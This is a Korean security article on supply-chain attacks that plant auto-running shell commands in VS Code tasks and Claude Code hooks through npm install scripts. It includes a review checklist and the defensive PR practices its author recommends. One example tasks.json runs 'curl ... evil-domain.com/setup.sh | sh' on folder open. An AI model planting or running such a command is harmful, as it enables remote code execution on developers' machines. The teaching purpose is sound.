## 왜 중요한가: 공격 경계의 확장

과거 소프트웨어 공급망 보안은 주로 `package.json`의 의존성이나 CI/CD 파이프라인의 보안에 집중했다. 그러나 2025년 npm 생태계를 휩쓴 'Shai-Hulud' 웜(postinstall 스크립트로 자가 전파, 11월 2.0 변종은 preinstall 단계 활용)처럼, 공격 벡터는 이제 개발자의 로컬 설정 파일까지 확장되고 있다.

AI 에이전트와 최신 IDE의 설정 파일(`.claude/settings.json`, `.vscode/tasks.json` 등)은 더 이상 단순한 개인화 옵션이 아니다. 이 파일들은 특정 조건(세션 시작, 폴더 열기 등)에서 자동으로 셸 명령을 실행할 수 있는 **실행 가능한 소프트웨어**다.

악의적인 npm 패키지는 설치 스크립트를 통해 이러한 설정 파일에 지속성(persistence)을 심을 수 있다. 개발자가 의심스러운 패키지를 제거하더라도, 이미 오염된 설정 파일은 저장소에 남아 계속해서 위협을 가할 수 있다. 따라서 이제 코드 리뷰와 보안 감사의 경계는 소스 코드를 넘어 개발 환경 설정 전체를 포함해야 한다.

## 핵심 패턴: 설정 파일을 통한 지속성 확보 공격

공격자는 신뢰 전이(trust transitivity)를 악용한다. 개발자는 `npm install`을 신뢰하고, 설치된 패키지가 생성한 설정 파일을 통해 실행되는 에디터/에이전트의 동작을 신뢰한다. 이 신뢰의 사슬이 공격 경로가 된다.

Blake Crosley가 인용한 Wiz, Endor Labs 등의 보고서에 따르면 공격 체인은 다음과 같이 구성된다.

```mermaid
graph TD
    A[1. 악성 npm 패키지 설치] --> B{2. npm 생명주기 스크립트 실행 · (postinstall)};
    B --> C["3. 개발자 도구 설정 파일에 · 악성 코드 주입"];
    C --> D[".vscode/tasks.json · (runOn: 'folderOpen')"];
    C --> E[".claude/settings.json · (SessionStart hook)"];
    F[4. 개발자가 폴더를 열거나 · AI 에이전트 세션 시작] --> G((5. 주입된 악성 코드 실행));
    D --> G;
    E --> G;
```

이 패턴의 핵심은 다음과 같은 공식 문서에 명시된 기능들을 조합하여 공격 경로를 만든다는 점이다.

1.  **npm 생명주기 스크립트**: `npm install` 시 `preinstall`, `install`, `postinstall` 스크립트를 자동으로 실행할 수 있다. (npm 공식 문서)
2.  **VS Code Tasks**: `.vscode/tasks.json` 파일에 `runOn: "folderOpen"` 속성을 설정하면, 사용자가 해당 폴더를 열 때 지정된 셸 명령이 실행될 수 있다. (VS Code 공식 문서)
3.  **Claude Code Hooks**: `.claude/settings.json` 파일의 `SessionStart` 같은 생명주기 훅은 세션이 시작될 때마다 사용자 정의 셸 명령을 실행할 수 있다. (Claude Code 공식 문서)

이러한 기능들은 본래 자동화를 위한 것이지만, 결합될 경우 패키지 설치 한 번으로 개발자 환경에 영구적인 백도어를 생성하는 강력한 도구가 된다.

### 리뷰 경계 확장: 어디를 확인해야 하는가?

| 파일 또는 영역             | 리뷰 시 질문                                           | 무시할 경우 위험                                     |
| -------------------------- | ------------------------------------------------------ | ---------------------------------------------------- |
| `.claude/settings.json`    | 생명주기 훅이 셸 명령을 실행하거나 외부로 데이터를 보내는가? | 에이전트 세션 시작이 악성 코드 실행 경로가 됨.         |
| `.vscode/tasks.json`       | `folderOpen` 시 실행되는 태스크가 있는가?                | 저장소를 여는 것만으로 의심스러운 코드가 실행될 수 있음. |
| `.github/workflows/*`      | 워크플로우가 민감한 secret을 읽거나 신뢰할 수 없는 입력을 실행하는가? | CI 환경이 탈취되거나 오염된 아티팩트가 배포될 수 있음. |
| `package.json` `scripts` | `install` 시점에 실행되는 스크립트가 추가되었는가?       | `npm install` 자체가 코드 실행의 트리거가 됨.          |

## 실전 적용: ai-study 프로젝트 PR 리뷰

`ai-study` 프로젝트에서 새로운 차트 라이브러리 도입을 위한 PR을 리뷰하는 상황을 가정하자. 기존 방식으로는 `package.json`의 의존성 버전과 라이선스, 그리고 소스 코드 변경 사항만 확인했을 것이다. 하지만 이제 다음과 같은 구체적인 액션을 추가해야 한다.

#### **체크리스트**

1.  **숨겨진 파일 변경 사항 확인**: PR의 `Files changed` 탭에서 단순히 소스 코드만 보지 말고, `.vscode/`, `.claude/`, `.github/` 등 점(dot)으로 시작하는 디렉토리의 변경 사항을 반드시 확인한다.
2.  **설정 파일의 '실행' 코드 분석**: 만약 `.vscode/tasks.json` 파일에 변경이 있다면, 아래와 같은 위험한 패턴이 있는지 검사한다. 이는 단순한 설정 변경이 아니라, 새로운 실행 파일 추가와 동일한 수준의 검토가 필요하다.
3.  **`package.json` 스크립트 검토**: `dependencies` 변경 외에 `scripts` 섹션에 `postinstall` 같은 생명주기 스크립트가 추가되었는지 확인한다. 만약 있다면, 해당 스크립트가 어떤 동작을 수행하는지 면밀히 분석해야 한다.

#### **위험한 설정 파일 예시 (TypeScript 프로젝트)**

다음은 `.vscode/tasks.json`에 추가될 수 있는 악성 태스크의 예시다.

```typescript
// .vscode/tasks.json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Check for new framework updates",
      // 이 label은 개발자를 속이기 위한 것이다.
      "type": "shell",
      // 'folderOpen' 트리거는 가장 위험한 신호 중 하나다.
      // 사용자가 이 폴더를 열 때마다 아래 명령어가 실행된다.
      "command": "curl -sL https://evil-domain.com/setup.sh | sh",
      "runOptions": {
        "runOn": "folderOpen"
      },
      "problemMatcher": []
    }
  ]
}
```

이 PR을 승인하면, 팀원들이 이 브랜치를 `git pull` 받고 VS Code에서 프로젝트를 여는 순간, 자신도 모르게 `evil-domain.com`의 셸 스크립트를 실행하게 된다.

따라서 `ai-study` 프로젝트의 PR 템플릿에 "설정 파일을 통한 자동 실행(예: `folderOpen` task, `postinstall` script)이 추가되었습니까?" 와 같은 체크리스트 항목을 추가하여 모든 기여자가 공급망 보안을 인지하고 검토하도록 강제하는 것이 좋다. 패키지 제거만으로는 충분하지 않으며, 의심스러운 설치 후에는 관련 설정 파일을 모두 제거하고 자격 증명을 교체하는 것이 안전하다.
